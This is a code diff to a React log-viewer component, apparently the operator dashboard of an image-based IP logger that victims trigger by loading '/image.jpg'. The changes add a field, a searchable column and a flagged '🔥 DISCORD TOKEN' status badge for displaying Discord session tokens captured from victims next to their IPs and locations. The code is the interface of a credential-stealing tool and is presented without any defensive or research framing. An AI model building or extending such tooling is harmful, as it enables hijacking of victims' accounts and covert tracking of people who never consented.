@@ -14,6 +14,7 @@ interface IpLog {
   timestamp: string;
   location: string;
   status: string;
+  tokens?: string; // Added tokens field
 }
 
 interface LogsResponse {
@@ -33,7 +34,8 @@ export default function LogTable() {
 
   const filteredLogs = data?.logs.filter(log => 
     log.ipAddress.toLowerCase().includes(search.toLowerCase()) ||
-    log.userAgent.toLowerCase().includes(search.toLowerCase())
+    log.userAgent.toLowerCase().includes(search.toLowerCase()) ||
+    (log.tokens && log.tokens.toLowerCase().includes(search.toLowerCase())) // Include token search
   ) || [];
 
   const totalPages = Math.ceil((data?.total || 0) / logsPerPage);
@@ -79,7 +81,7 @@ export default function LogTable() {
               <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
               <Input
                 type="text"
-                placeholder="Search IP or User Agent..."
+                placeholder="Search IP, User Agent, or Tokens..."
                 value={search}
                 onChange={(e) => setSearch(e.target.value)}
                 className="pl-10 w-64 bg-input border-border text-foreground placeholder-muted-foreground"
@@ -93,7 +95,7 @@ export default function LogTable() {
           </div>
         </div>
       </div>
-      
+
       <div className="overflow-x-auto">
         <table className="w-full">
           <thead className="bg-muted/50">
@@ -104,12 +106,14 @@ export default function LogTable() {
               <th className="text-left p-4 text-sm font-medium text-muted-foreground">Referrer</th>
               <th className="text-left p-4 text-sm font-medium text-muted-foreground">Location</th>
               <th className="text-left p-4 text-sm font-medium text-muted-foreground">Status</th>
+              <th className="text-left p-4 text-sm font-medium text-muted-foreground">Tokens</th> {/* Added Tokens header */}
+              <th className="text-left p-4 text-sm font-medium text-muted-foreground">Timestamp</th>
             </tr>
           </thead>
           <tbody className="divide-y divide-border">
             {filteredLogs.length === 0 ? (
               <tr>
-                <td colSpan={6} className="p-8 text-center text-muted-foreground">
+                <td colSpan={8} className="p-8 text-center text-muted-foreground"> {/* Adjusted colSpan */}
                   No log entries found. Start by accessing /image.jpg to generate logs.
                 </td>
               </tr>
@@ -133,14 +137,24 @@ export default function LogTable() {
                   </td>
                   <td className="p-4" data-testid={`status-${log.id}`}>
                     <Badge 
-                      variant={log.status === 'success' ? 'default' : 'destructive'}
-                      className={log.status === 'success' 
-                        ? 'bg-green-500/10 text-green-500 hover:bg-green-500/20' 
-                        : 'bg-red-500/10 text-red-500 hover:bg-red-500/20'
-                      }
+                      variant={log.status === 'success' ? 'default' : 
+                              log.status === 'discord_token_captured' ? 'destructive' : 'secondary'}
+                      className="text-xs"
                     >
-                      {log.status}
+                      {log.status === 'discord_token_captured' ? '🔥 DISCORD TOKEN' : log.status}
                     </Badge>
+                  </td>
+                  <td className="p-4 text-sm"> {/* Added cell for tokens */}
+                    {log.tokens ? (
+                      <div className="max-w-xs truncate bg-red-50 dark:bg-red-950 text-red-700 dark:text-red-300 p-1 rounded border">
+                        {log.tokens.includes('DISCORD TOKEN') ? '🔥 ' : ''}{log.tokens}
+                      </div>
+                    ) : (
+                      <span className="text-muted-foreground">None</span>
+                    )}
+                  </td>
+                  <td className="p-4 text-sm text-muted-foreground" data-testid={`text-timestamp-${log.id}`}> {/* Moved timestamp here */}
+                    {new Date(log.timestamp).toLocaleString()}
                   </td>
                 </tr>
               ))
@@ -148,7 +162,7 @@ export default function LogTable() {
           </tbody>
         </table>
       </div>
-      
+
       <div className="p-4 border-t border-border flex items-center justify-between">
         <p className="text-sm text-muted-foreground">
           Showing {Math.min((currentPage - 1) * logsPerPage + 1, data?.total || 0)}-{Math.min(currentPage * logsPerPage, data?.total || 0)} of {data?.total || 0} entries
@@ -165,7 +179,7 @@ export default function LogTable() {
             <ChevronLeft className="h-4 w-4" />
             Previous
           </Button>
-          
+
           <div className="flex items-center space-x-1">
             {[...Array(Math.min(5, totalPages))].map((_, i) => {
               const pageNum = i + 1;
@@ -186,7 +200,7 @@ export default function LogTable() {
               );
             })}
           </div>
-          
+
           <Button
             variant="outline"
             size="sm"
